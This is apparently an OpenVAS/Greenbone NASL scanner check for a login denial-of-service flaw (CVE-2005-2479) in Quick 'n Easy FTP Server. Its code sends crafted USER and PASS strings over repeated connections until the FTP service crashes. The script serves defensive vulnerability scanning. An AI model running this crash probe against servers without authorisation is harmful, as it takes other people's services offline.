if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802003" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-03-09 16:08:21 +0100 (Wed, 09 Mar 2011)" );
	script_cve_id( "CVE-2005-2479" );
	script_bugtraq_id( 14451 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Quick 'n Easy FTP Login Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/quick_n_easy/detected" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/16260" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/98782" );
	script_tag( name: "impact", value: "Successful exploitation will allow the remote attackers to cause
  a denial of service." );
	script_tag( name: "affected", value: "Quick 'n Easy FTP Server Version 3.2, other versions may also
  be affected." );
	script_tag( name: "insight", value: "The flaw is due to the way server handles 'USER' and 'PASS'
  commands, which can be exploited to crash the FTP service by sending 'USER'
  and 'PASS' commands with specially-crafted parameters." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Quick 'n Easy FTP Server and is prone to
  denial of service vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "Quick 'n Easy FTP Server" )){
	exit( 0 );
}
flag = 0;
craf_cmd = "";
for(i = 0;i < 15;i++){
	soc1 = open_sock_tcp( ftpPort );
	if(!soc1 && flag == 0){
		exit( 0 );
	}
	if(!soc1){
		security_message( ftpPort );
		exit( 0 );
	}
	resp = recv_line( socket: soc1, length: 100 );
	if(!ContainsString( resp, "Quick 'n Easy FTP Server" )){
		security_message( ftpPort );
		exit( 0 );
	}
	craf_cmd += "aa" + "?";
	send( socket: soc1, data: "USER " + craf_cmd + "\r\n" );
	recv_line( socket: soc1, length: 100 );
	send( socket: soc1, data: "PASS " + craf_cmd + "\r\n" );
	resp = recv_line( socket: soc1, length: 100 );
	if(ContainsString( resp, "530 Not logged in, user or password incorrect!" )){
		soc = open_sock_tcp( ftpPort );
		close( soc );
	}
}

